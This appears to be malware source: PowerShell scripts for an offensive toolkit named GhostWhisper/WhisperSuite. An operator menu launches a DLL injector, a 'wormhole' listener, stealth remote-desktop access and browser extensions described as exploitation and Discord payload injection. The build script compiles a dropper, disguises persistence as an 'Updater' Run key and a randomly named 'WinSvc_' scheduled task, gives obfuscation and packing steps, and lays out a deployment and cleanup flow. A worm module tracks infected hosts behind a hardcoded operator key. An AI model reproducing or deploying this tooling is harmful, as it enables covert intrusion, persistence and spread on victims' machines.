1: # GhostWhisperBootstrap.ps1
2: # Master launcher for GhostWhisper Suite (Raven Edition), with full module list and LinuxPDF VM integration
3: 
4: Write-Host "[🕊️] Initializing GhostWhisper Bootstrap..."
5: 
6: # 1. Verify admin privileges
7: if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
8:     Write-Warning "Admin rights required. Relaunch as Administrator."
9:     exit
10: }
11: 
12: # 2. Load Modules
13: $modules = @(
14:     "Modules\GhostResidency.ps1",
15:     "Modules\ExorcistMode.ps1",
16:     "Modules\GhostLogger.ps1",
17:     "Modules\AnomalyHunter.ps1",
18:     "Modules\Anomaly_Detector.ps1",
19:     "Modules\GhostSeal.ps1",
20:     "Modules\Phase_Anoint.ps1",
21:     "Modules\Phase_Bind.ps1",
22:     "Modules\Phase_Cleanse.ps1",
23:     "Modules\LinuxPDF_Emu.ps1",
24:     "Modules\LinuxPDF_Runtime.ps1",
25:     "Modules\Wormhole.ps1",
26:     "Modules\Phantom.ps1", # <-- Combined SearchPhantom + PrismGhost
27:     "Modules\GhostDesktop.ps1", # <-- Stealth Chrome RDP module
28:     "Modules\GhostKernel.ps1", # <-- Linux kernel module interface
29:     "Modules\GhostBrowser.ps1" # <-- Chrome extension deployment
30: )
31: 
32: foreach ($mod in $modules) {
33:     $modPath = Join-Path $PSScriptRoot $mod
34:     if (Test-Path $modPath) {
35:         . $modPath
36:         Write-Host "[+] Loaded: $mod"
37:     }
38:     else {
39:         Write-Warning "[-] Missing module: $modPath"
40:     }
41: }
42: 
43: # 3. Run Anomaly Detection (if available)
44: Write-Host "[*] Running environment safety scan (AnomalyHunter + Detector)..."
45: if (Get-Command -Name Start-AnomalyHunt -ErrorAction SilentlyContinue) {
46:     Start-AnomalyHunt -Path "$env:SystemDrive\" -Log
47: }
48: else {
49:     Write-Warning "Function 'Start-AnomalyHunt' not found. Skipping anomaly scan."
50: }
51: 
52: if (Get-Command -Name Invoke-AnomalyDetector -ErrorAction SilentlyContinue) {
53:     Invoke-AnomalyDetector -Scope "SystemDrive"
54: }
55: else {
56:     Write-Warning "Function 'Invoke-AnomalyDetector' not found. Skipping additional detection."
57: }
58: 
59: # 4. Operator Menu
60: function Show-OperatorMenu {
61:     Write-Host ""
62:     Write-Host "GhostWhisper Operator Menu:"
63:     Write-Host "[1] Start Recon Session (GhostResidency)"
64:     Write-Host "[2] Run ExorcistMode Cleanup"
65:     Write-Host "[3] Deploy GhostKey & WraithTap"
66:     Write-Host "[4] Activate Wormhole Listener"
67:     Write-Host "[5] Run GhostLinux VM (via LinuxPDF.exe + ghost_boot.iso)"
68:     Write-Host "[6] Exit"
69:     Write-Host "[7] Deploy Phantom Recon Stack (SearchPhantom + PrismGhost)"
70:     Write-Host "[8] Install Stealth Desktop Access (Chrome RDP)"
71:     Write-Host "[9] Deploy GhostKernel (Linux Disk Access)"
72:     Write-Host "[10] Deploy GhostBrowser (Chrome Extension)"
73:     Write-Host ""
74: }
75: 
76: while ($true) {
77:     Show-OperatorMenu
78:     $choice = Read-Host "Choose action"
79: 
80:     switch ($choice) {
81:         "1" {
82:             Write-Host "[🧠] GhostResidency engagement starting..."
83:             if (Get-Command -Name Start-GhostResidency -ErrorAction SilentlyContinue) {
84:                 Start-GhostResidency -Mode "Recon"
85:             }
86:             else {
87:                 Write-Warning "Start-GhostResidency function missing."
88:             }
89:         }
90:         "2" {
91:             $scanPath = Read-Host "Enter path to scan (default: TEMP)"
92:             if (-not $scanPath) { $scanPath = $env:TEMP }
93:             if (Get-Command -Name Start-Exorcism -ErrorAction SilentlyContinue) {
94:                 Start-Exorcism -Path $scanPath -Log
95:             }
96:             else {
97:                 Write-Warning "Start-Exorcism function missing."
98:             }
99:         }
100:         "3" {
101:             Write-Host "[🔐] Injecting GhostKey..."
102:             $ghostDll = Join-Path $PSScriptRoot "GhostKey.dll"
103:             $wraithTap = Join-Path $PSScriptRoot "WraithTap.exe"
104:             if (-not (Test-Path $ghostDll) -or -not (Test-Path $wraithTap)) {
105:                 Write-Warning "Missing WraithTap or GhostKey. Please compile first."
106:             }
107:             else {
108:                 Start-Process -WindowStyle Hidden -FilePath $wraithTap -ArgumentList $ghostDll
109:             }
110:         }
111:         "4" {
112:             Write-Host "[📡] Activating wormhole beacon..."
113:             if (Get-Command -Name Start-WormholeListener -ErrorAction SilentlyContinue) {
114:                 Start-WormholeListener
115:             }
116:             else {
117:                 Write-Warning "Function 'Start-WormholeListener' missing from Wormhole module."
118:             }
119:         }
120:         "5" {
121:             Write-Host "[🔥] Launching GhostLinux VM environment..."
122:             $linuxPdfExe = Join-Path $PSScriptRoot "LinuxPDF.exe"
123:             $isoPath = Join-Path $PSScriptRoot "ghost_boot.iso"
124: 
125:             if (-not (Test-Path $linuxPdfExe)) {
126:                 Write-Warning "LinuxPDF.exe not found. Please build/publish it."
127:                 break
128:             }
129:             if (-not (Test-Path $isoPath)) {
130:                 Write-Warning "ghost_boot.iso not found. Please run CreateGhostISO.ps1 or place it here."
131:                 break
132:             }
133: 
134:             $args = "--boot=""$isoPath"""
135:             Write-Host "Running: $linuxPdfExe $args"
136:             Start-Process -FilePath $linuxPdfExe -ArgumentList $args
137:         }
138:         "6" {
139:             Write-Host "[✖] Exiting. Ghost sleeps."
140:             break
141:         }
142:         "7" {
143:             Write-Host "[👻] Launching Phantom Recon Module..."
144:             if (Get-Command -Name Start-PhantomRecon -ErrorAction SilentlyContinue) {
145:                  $logPath = Join-Path $PSScriptRoot "Logs\Phantom.log"
146:                 if (-not (Test-Path "$PSScriptRoot\Logs")) {
147:                     New-Item -ItemType Directory -Path "$PSScriptRoot\Logs" | Out-Null
148:                 }
149:                 Start-PhantomRecon -Mode "SilentHijack" -LogPath $logPath
150:             }
151:             else {
152:                 Write-Warning "Start-PhantomRecon function not found. Ensure Phantom.ps1 is correctly placed."
153:             }
154:         }
155:         "8" {
156:             Write-Host "[🖥️] Installing stealth desktop access..."
157:             $ghostTag = Read-Host "Enter Ghost Tag (default: Gx01)"
158:             if (-not $ghostTag) { $ghostTag = "Gx01" }
159:             
160:             if (Get-Command -Name Install-GhostDesktop -ErrorAction SilentlyContinue) {
161:                 $result = Install-GhostDesktop -GhostTag $ghostTag -Silent
162:                 if ($result) {
163:                     Write-Host "[+] Desktop access installed successfully"
164:                     Write-Host "[i] Use Chrome Remote Desktop or RDP to connect"
165:                 } else {
166:                     Write-Warning "Desktop installation failed. Check logs."
167:                 }
168:             }
169:             else {
170:                 Write-Warning "Install-GhostDesktop function not found. Ensure GhostDesktop.ps1 is loaded."
171:             }
172:         }
173:         "9" {
174:             Write-Host "[🔮] Deploying GhostKernel module..."
175:             $ghostTag = Read-Host "Enter Ghost Tag (default: Gx01)"
176:             if (-not $ghostTag) { $ghostTag = "Gx01" }
177:             
178:             $targetDevice = Read-Host "Enter target device (default: /dev/sdb)"
179:             if (-not $targetDevice) { $targetDevice = "/dev/sdb" }
180:             
181:             if (Get-Command -Name Start-GhostKernelSession -ErrorAction SilentlyContinue) {
182:                 $result = Start-GhostKernelSession -TargetDevice $targetDevice -GhostTag $ghostTag
183:                 if ($result) {
184:                     Write-Host "[+] GhostKernel session active"
185:                     Write-Host "[i] Use PowerShell commands to interact with kernel module"
186:                     Write-Host "[i] Example: Read-GhostKernelSector -Sector 0"
187:                 } else {
188:                     Write-Warning "GhostKernel deployment failed. Check logs."
189:                 }
190:             }
191:             else {
192:                 Write-Warning "Start-GhostKernelSession function not found. Ensure GhostKernel.ps1 is loaded."
193:             }
194:         }
195:         "10" {
196:             Write-Host "[🌐] Deploying GhostBrowser extension..."
197:             $ghostTag = Read-Host "Enter Ghost Tag (default: Gx01)"
198:             if (-not $ghostTag) { $ghostTag = "Gx01" }
199:             
200:             Write-Host "[*] Available extension types:"
201:             Write-Host "    [1] GhostCore - General purpose browser exploitation"
202:             Write-Host "    [2] Discord - Discord-targeted payload injection"
203:             Write-Host "    [3] GhostSurface - Advanced memory manipulation"
204:             
205:             $extChoice = Read-Host "Select extension type (1-3)"
206:             $extType = switch ($extChoice) {
207:                 "1" { "ghostcore" }
208:                 "2" { "discord" }
209:                 "3" { "ghostsurface" }
210:                 default { "ghostcore" }
211:             }
212:             
213:             $persistent = Read-Host "Install persistently? (y/N)"
214:             $persistentFlag = ($persistent -eq "y" -or $persistent -eq "Y")
215:             
216:             if (Get-Command -Name Install-GhostBrowserExtension -ErrorAction SilentlyContinue) {
217:                 $result = Install-GhostBrowserExtension -ExtensionType $extType -GhostTag $ghostTag -Persistent:$persistentFlag
218:                 if ($result) {
219:                     Write-Host "[+] Browser extension deployed successfully"
220:                     Write-Host "[i] Chrome will launch with the extension loaded"
221:                     Write-Host "[i] Extension provides memory exploitation and system access"
222:                     
223:                     # Optionally build native messaging host
224:                     $buildHost = Read-Host "Build native messaging host for system access? (y/N)"
225:                     if ($buildHost -eq "y" -or $buildHost -eq "Y") {
226:                         if (Get-Command -Name Build-NativeMessagingHost -ErrorAction SilentlyContinue) {
227:                             Build-NativeMessagingHost -GhostTag $ghostTag
228:                         }
229:                     }
230:                 } else {
231:                     Write-Warning "Browser extension deployment failed. Check logs."
232:                 }
233:             }
234:             else {
235:                 Write-Warning "Install-GhostBrowserExtension function not found. Ensure GhostBrowser.ps1 is loaded."
236:             }
237:         }
238:         default {
239:             Write-Warning "Invalid selection. Try again."
240:         }
241:     }
242: }
243: 
244: Write-Host "[~] GhostWhisperBootstrap session ended."

1: # BuildDeployWhisper.ps1
2: # Master build + deployment script for WhisperSuite: GhostWhisper Edition
3: # Includes compilation, polymorphism, persistence, BLE trigger, wormhole, and virtualization
4: 
5: $baseDir = $PSScriptRoot
6: $finalPackage = Join-Path $baseDir "WhisperSuite_Build"
7: $dropperSource = Join-Path $baseDir "Dropper_with_Raven.cpp"
8: 
9: # === Core Binaries ===
10: $ghostKeyDLL = Join-Path $baseDir "GhostKey\bin\Release\GhostKey.dll"
11: $injectorEXE = Join-Path $baseDir "WraithTap\x64\Release\WraithTap.exe"
12: $dropperEXE = Join-Path $baseDir "Dropper_with_Raven.exe"
13: $cleanerPS1 = Join-Path $baseDir "SilentBloom.ps1"
14: $bleTriggerScript = Join-Path $baseDir "BLETrigger.ps1"
15: $polymorphScript = Join-Path $baseDir "GhostPolymorph.ps1"
16: $bleConnectScript = Join-Path $baseDir "GhostBLEConnect_v2.ps1"
17: $bootstrapScript = Join-Path $baseDir "GhostWhisperBootstrap.ps1"
18: 
19: # === Modules ===
20: $modulePaths = @(
21:     "Modules\GhostLogger.ps1",
22:     "Modules\AnomalyHunter.ps1",
23:     "Modules\Anomaly_Detector.ps1",
24:     "Modules\Wormhole.ps1",
25:     "Modules\LinuxPDF_Emu.ps1",
26:     "Modules\LinuxPDF_Runtime.ps1",
27:     "Modules\Phase_Anoint.ps1",
28:     "Modules\Phase_Bind.ps1",
29:     "Modules\Phase_Cleanse.ps1",
30:     "Modules\GhostResidency.ps1",
31:     "Modules\GhostSeal.ps1",
32:     "Modules\ExorcistMode.ps1",
33:     "Modules\GhostDesktop.ps1",
34:     "Modules\GhostKernel.ps1",
35:     "Modules\GhostBrowser.ps1"
36: )
37: 
38: function Compile-Projects {
39:     Write-Host "[*] Compiling C# GhostKey DLL..."
40:     msbuild "$baseDir\GhostKey\GhostKey.csproj" /p:Configuration=Release | Out-Null
41: 
42:     Write-Host "[*] Compiling C++ WraithTap Injector..."
43:     msbuild "$baseDir\WraithTap\WraithTap.vcxproj" /p:Configuration=Release /p:Platform=x64 | Out-Null
44: }
45: 
46: function Compile-Dropper {
47:     Write-Host "[*] Compiling Dropper_with_Raven.cpp (poem embed tool)..."
48: 
49:     if (Test-Path $dropperSource) {
50:         & cl.exe /EHsc /O2 "/Fe:$dropperEXE" $dropperSource
51:         if ($LASTEXITCODE -eq 0) {
52:             Write-Host "[+] Dropper compiled: $dropperEXE"
53:         }
54:         else {
55:             Write-Warning "[-] Dropper compile failed with exit code $LASTEXITCODE"
56:         }
57:     }
58:     else {
59:         Write-Warning "[-] $dropperSource not found; skipping poem embed step."
60:     }
61: }
62: 
63: function Embed-RavenPoem {
64:     Write-Host "[*] Embedding Raven's poem into injector..."
65:     if (Test-Path $dropperEXE -and (Test-Path $injectorEXE)) {
66:         & $dropperEXE $injectorEXE
67:         if ($LASTEXITCODE -eq 0) {
68:             Write-Host "[+] Poem appended successfully."
69:         }
70:         else {
71:             Write-Warning "[-] Poem embed failed. Exit code: $LASTEXITCODE"
72:         }
73:     }
74:     else {
75:         Write-Warning "[-] Dropper or WraithTap exe missing; cannot embed poem."
76:     }
77: }
78: 
79: function Build-GhostKernel {
80:     Write-Host "[*] Building GhostKernel module..."
81:     
82:     # Check if we're on Linux/WSL for kernel module compilation
83:     if ($IsLinux -or (Get-Command "wsl" -ErrorAction SilentlyContinue)) {
84:         $kernelSource = Join-Path $baseDir "GhostKernel.c"
85:         $makefile = Join-Path $baseDir "GhostKernel.mk"
86:         
87:         if (Test-Path $kernelSource) {
88:             try {
89:                 if ($IsLinux) {
90:                     # Direct Linux compilation
91:                     & make -f $makefile all
92:                 } else {
93:                     # Windows with WSL
94:                     & wsl make -f $makefile all
95:                 }
96:                 
97:                 if ($LASTEXITCODE -eq 0) {
98:                     Write-Host "[+] GhostKernel module compiled successfully"
99:                 } else {
100:                     Write-Warning "[-] GhostKernel compilation failed"
101:                 }
102:             } catch {
103:                 Write-Warning "[-] GhostKernel build error: $($_.Exception.Message)"
104:             }
105:         } else {
106:             Write-Warning "[-] GhostKernel.c not found"
107:         }
108:     } else {
109:         Write-Host "[i] Skipping GhostKernel build (Linux/WSL not available)"
110:     }
111: }
112: 
113: function Prepare-Package {
114:     Write-Host "[*] Packaging WhisperSuite build..."
115:     New-Item -ItemType Directory -Path $finalPackage -Force | Out-Null
116:     New-Item -ItemType Directory -Path "$finalPackage\Modules" -Force | Out-Null
117: 
118:     # Copy final EXE (poem embedded) + other artifacts
119:     Copy-Item $injectorEXE        (Join-Path $finalPackage "WraithTap.exe") -Force
120:     Copy-Item $ghostKeyDLL        (Join-Path $finalPackage "GhostKey.dll")  -Force
121:     Copy-Item $cleanerPS1         (Join-Path $finalPackage "SilentBloom.ps1") -Force
122:     Copy-Item $bleTriggerScript   (Join-Path $finalPackage "BLETrigger.ps1")  -Force
123:     Copy-Item $polymorphScript    (Join-Path $finalPackage "GhostPolymorph.ps1") -Force
124:     Copy-Item $bleConnectScript   (Join-Path $finalPackage "GhostBLEConnect_v2.ps1") -Force
125:     Copy-Item $bootstrapScript    (Join-Path $finalPackage "GhostWhisperBootstrap.ps1") -Force
126: 
127:     # Copy kernel module if built
128:     $kernelModule = Join-Path $baseDir "ghostkernel.ko"
129:     if (Test-Path $kernelModule) {
130:         Copy-Item $kernelModule (Join-Path $finalPackage "ghostkernel.ko") -Force
131:         Write-Host "[+] GhostKernel module copied"
132:     }
133:     
134:     # Copy kernel build files
135:     $kernelMakefile = Join-Path $baseDir "GhostKernel.mk"
136:     $kernelSource = Join-Path $baseDir "GhostKernel.c"
137:     if (Test-Path $kernelMakefile) {
138:         Copy-Item $kernelMakefile (Join-Path $finalPackage "GhostKernel.mk") -Force
139:     }
140:     if (Test-Path $kernelSource) {
141:         Copy-Item $kernelSource (Join-Path $finalPackage "GhostKernel.c") -Force
142:     }
143:     
144:     # Copy PhantomHook browser extensions
145:     $phantomHookPath = Join-Path $baseDir "PhantomHook"
146:     if (Test-Path $phantomHookPath) {
147:         $browserDestination = Join-Path $finalPackage "PhantomHook"
148:         Copy-Item $phantomHookPath $browserDestination -Recurse -Force
149:         Write-Host "[+] PhantomHook browser extensions copied"
150:     }
151: 
152:     # Modules
153:     foreach ($mod in $modulePaths) {
154:         $fullPath = Join-Path $baseDir $mod
155:         if (Test-Path $fullPath) {
156:             $destPath = Join-Path $finalPackage $mod
157:             # Ensure directory structure
158:             New-Item -ItemType Directory -Path (Split-Path $destPath) -Force | Out-Null
159:             Copy-Item $fullPath $destPath -Force
160:         }
161:         else {
162:             Write-Warning "[!] Missing module: $mod"
163:         }
164:     }
165: 
166:     # Tribute note
167:     $note = @"
168: This toolkit is a ghost in motion.
169: It exists for those who are unseen.
170: And for one who is gone, but not forgotten.
171: 
172: —R
173: "@
174:     Set-Content -Path (Join-Path $finalPackage "note.txt") -Value $note
175: 
176:     Write-Host "[✓] WhisperSuite is ready: $finalPackage"
177: }
178: 
179: function Setup-Persistence {
180:     Write-Host "[*] Creating registry and scheduled task persistence..."
181: 
182:     $payloadPath = "C:\\Windows\\System32\\GhostKey.dll"
183:     $injectorPath = "C:\\Windows\\System32\\WraithTap.exe"
184:     $execCommand = "$injectorPath $payloadPath"
185: 
186:     try {
187:         Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
188:             -Name "Updater" -Value $execCommand -Force
189:         Write-Host "[+] Registry persistence set (HKCU Run key)."
190:     }
191:     catch {
192:         Write-Warning "[-] Failed to create registry key: $_"
193:     }
194: 
195:     try {
196:         $taskName = "WinSvc_" + -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
197:         schtasks /create /tn $taskName /tr "\"$injectorPath\" \"$payloadPath\"" `
198:             /sc onlogon /rl highest /f | Out-Null
199:         Write-Host "[+] Scheduled task created ($taskName)."
200:     }
201:     catch {
202:         Write-Warning "[-] Failed to create scheduled task: $_"
203:     }
204: }
205: 
206: function Deploy-BLETrigger {
207:     Write-Host "[*] Creating BLE trigger script with encrypted handshake and EDR evasion..."
208:     $templatePath = Join-Path $baseDir "Templates\BLETrigger_Encrypted.ps1"
209:     if (Test-Path $templatePath) {
210:         $bleScript = Get-Content $templatePath -Raw
211:         Set-Content -Path $bleTriggerScript -Value $bleScript
212:         Write-Host "[+] BLE trigger deployed."
213:     }
214:     else {
215:         Write-Warning "[-] BLETrigger_Encrypted.ps1 not found in Templates."
216:     }
217: }
218: 
219: function Show-Obfuscation-Checklist {
220:     Write-Host "`n===== OBFUSCATION CHECKLIST ====="
221:     Write-Host "[1] Run GhostKey.dll through ConfuserEx or Dotfuscator"
222:     Write-Host "[2] Strip symbols from WraithTap.exe (/DEBUG:NONE)"
223:     Write-Host "[3] Use UPX or similar packer for WraithTap"
224:     Write-Host "[4] Randomize filenames or strings for each deployment"
225:     Write-Host "[5] Wipe build artifacts with cipher /w or sdelete"
226:     Write-Host "[6] Optionally sign with throwaway certificate"
227: }
228: 
229: function Show-Deployment-Flow {
230:     Write-Host "`n===== DEPLOYMENT FLOW ====="
231:     Write-Host "[1] Transfer WhisperSuite_Build to secure device (USB, Flipper, etc)"
232:     Write-Host "[2] Use GhostWhisperBootstrap.ps1 to engage modules"
233:     Write-Host "[3] Trigger via BLETrigger.ps1 or WraithTap.exe GhostKey.dll"
234:     Write-Host "[4] Run SilentBloom.ps1 post-op for cleanup"
235:     Write-Host "[5] Securely shred or format exfiltration media"
236: }
237: 
238: # === EXECUTION ===
239: Compile-Projects
240: Compile-Dropper
241: Embed-RavenPoem
242: Build-GhostKernel
243: Prepare-Package
244: Setup-Persistence
245: Deploy-BLETrigger
246: Show-Obfuscation-Checklist
247: Show-Deployment-Flow

1: # Modules/GhostLogger.ps1
2: # Lightweight ghost activity logger with time-based tracking
3: 
4: function Write-GhostLog {
5:     param(
6:         [Parameter(Mandatory = $true)]
7:         [string]$Message,
8: 
9:         [string]$LogFile = "$env:ProgramData\ghost_ops_log.txt"
10:     )
11: 
12:     $timestamp = Get-Date -Format o
13:     $entry = "[$timestamp] $Message"
14: 
15:     try {
16:         Add-Content -Path $LogFile -Value $entry
17:     }
18:     catch {
19:         Write-Warning "[GhostLogger] Failed to write to log: $LogFile"
20:     }
21: }
22: 
23: function Read-GhostLog {
24:     param(
25:         [string]$LogFile = "$env:ProgramData\ghost_ops_log.txt",
26:         [int]$Tail = 25
27:     )
28: 
29:     if (Test-Path $LogFile) {
30:         Get-Content -Path $LogFile -Tail $Tail | ForEach-Object { Write-Host $_ }
31:     }
32:     else {
33:         Write-Warning "[GhostLogger] Log file not found: $LogFile"
34:     }
35: }
36: 
37: function Clear-GhostLog {
38:     param(
39:         [string]$LogFile = "$env:ProgramData\ghost_ops_log.txt"
40:     )
41: 
42:     if (Test-Path $LogFile) {
43:         try {
44:             Clear-Content -Path $LogFile
45:             Write-Host "[GhostLogger] Cleared log: $LogFile"
46:         }
47:         catch {
48:             Write-Warning "[GhostLogger] Failed to clear log."
49:         }
50:     }
51:     else {
52:         Write-Host "[GhostLogger] No log file to clear."
53:     }
54: }

1: # Modules/Wormhole.ps1
2: # Wormhole Protocol - Stealth propagation with operator handshake gating
3: # Memory-only propagation, no persistent writes
4: 
5: $script:InfectionMap = @{}
6: $script:OperatorKey = 'RvL_0517'
7: $script:WormholeActive = $false
8: 
9: function Get-OperatorSignature {
10:     param([string]$Data)
11:     $kb = [Text.Encoding]::UTF8.GetBytes($script:OperatorKey)
12:     $db = [Text.Encoding]::UTF8.GetBytes($Data)
13:     $h = New-Object System.Security.Cryptography.HMACSHA256
14:     $h.Key = $kb
15:     return ([BitConverter]::ToString($h.ComputeHash($db))) -replace '-', ''
16: }
17: 
18: function Test-OperatorHandshake {
19:     param(
20:         [string]$Challenge,
21:         [string]$Response
22:     )
23:     $expected = Get-OperatorSignature -Data $Challenge
24:     return ($expected -eq $Response)
25: }
26: 
27: function Test-AlreadyInfected {
28:     param([string]$HostId)
29:     return $script:InfectionMap.ContainsKey($HostId)
30: }
